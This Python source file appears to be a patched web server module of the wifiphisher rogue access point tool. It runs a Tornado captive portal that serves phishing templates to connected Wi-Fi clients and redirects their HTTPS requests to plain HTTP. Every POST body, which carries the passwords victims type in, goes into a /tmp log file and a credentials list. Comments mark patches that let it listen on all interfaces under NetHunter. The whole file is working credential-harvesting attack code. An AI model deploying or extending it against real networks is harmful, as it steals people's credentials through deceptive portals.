import logging
import json
from tornado.escape import json_decode
import tornado.ioloop
import tornado.web
import os.path
import wifiphisher.common.uimethods as uimethods
import wifiphisher.common.extensions as extensions
import wifiphisher.common.constants as constants

hn = logging.NullHandler()
hn.setLevel(logging.DEBUG)
logging.getLogger('tornado.access').disabled = True
logging.getLogger('tornado.general').disabled = True

template = False
terminate = False
creds = []
logger = logging.getLogger(__name__)


class DowngradeToHTTP(tornado.web.RequestHandler):
    def get(self):
        # PATCHED: use dynamic GW IP instead of hardcoded 10.0.0.1
        self.redirect("http://%s:%s/" % (constants.NETWORK_GW_IP, constants.PORT))


class BackendHandler(tornado.web.RequestHandler):
    """
    Validate the POST requests from client by the uimethods
    """

    def initialize(self, em):
        self.em = em

    def post(self):
        json_obj = json_decode(self.request.body)
        response_to_send = {}
        backend_methods = self.em.get_backend_funcs()
        for func_name in list(json_obj.keys()):
            if func_name in backend_methods:
                callback = getattr(backend_methods[func_name], func_name)
                response_to_send[func_name] = callback(json_obj[func_name])
            else:
                response_to_send[func_name] = "NotFound"

        self.write(json.dumps(response_to_send))


class CaptivePortalHandler(tornado.web.RequestHandler):
    def get(self):
        requested_file = self.request.path[1:]
        template_directory = template.get_path()

        if os.path.isfile(template_directory + requested_file):
            render_file = requested_file
        else:
            render_file = "index.html"

        file_path = template_directory + render_file
        self.render(file_path, **template.get_context())

        log_file_path = "/tmp/wifiphisher-webserver.tmp"
        with open(log_file_path, "a+") as log_file:
            log_file.write("GET request from {0} for {1}\n".format(
                self.request.remote_ip, self.request.full_url()))
        logger.info("GET request from %s for %s", self.request.remote_ip,
                    self.request.full_url())

    def post(self):
        global terminate

        try:
            content_type = self.request.headers["Content-Type"]
        except KeyError:
            return

        if content_type.startswith(constants.VALID_POST_CONTENT_TYPE):
            post_data = tornado.escape.url_unescape(self.request.body)
            log_file_path = "/tmp/wifiphisher-webserver.tmp"
            with open(log_file_path, "a+") as log_file:
                log_file.write("POST request from {0} with {1}\n".format(
                    self.request.remote_ip, post_data))
                logger.info("POST request from %s with %s",
                            self.request.remote_ip, post_data)

            creds.append(post_data)
            terminate = True

        requested_file = self.request.path[1:]
        template_directory = template.get_path()

        if os.path.isfile(template_directory + requested_file):
            render_file = requested_file
        else:
            render_file = "index.html"

        file_path = template_directory + render_file
        self.render(file_path, **template.get_context())


def runHTTPServer(ip, port, ssl_port, t, em):
    global template
    template = t

    for f in em.get_ui_funcs():
        setattr(uimethods, f.__name__, f)

    app = tornado.web.Application(
        [
            (r"/backend/.*", BackendHandler, {
                "em": em
            }),
            (r"/.*", CaptivePortalHandler),
        ],
        template_path=template.get_path(),
        static_path=template.get_path_static(),
        compiled_template_cache=False,
        ui_methods=uimethods)

    # PATCHED: bind to 0.0.0.0 on NetHunter so hotspot clients can reach us
    # (on Linux, binding to GW IP is fine; on Android the hotspot IP
    #  might not be on the expected interface from tornado's perspective)
    listen_ip = ip
    try:
        from wifiphisher.common.accesspoint import is_nethunter_environment
        if is_nethunter_environment():
            listen_ip = '0.0.0.0'
    except ImportError:
        pass

    app.listen(port, address=listen_ip)

    ssl_app = tornado.web.Application([(r"/.*", DowngradeToHTTP)])
    https_server = tornado.httpserver.HTTPServer(
        ssl_app,
        ssl_options={
            "certfile": constants.PEM,
            "keyfile": constants.PEM,
        })
    https_server.listen(ssl_port, address=listen_ip)

    tornado.ioloop.IOLoop.instance().start()
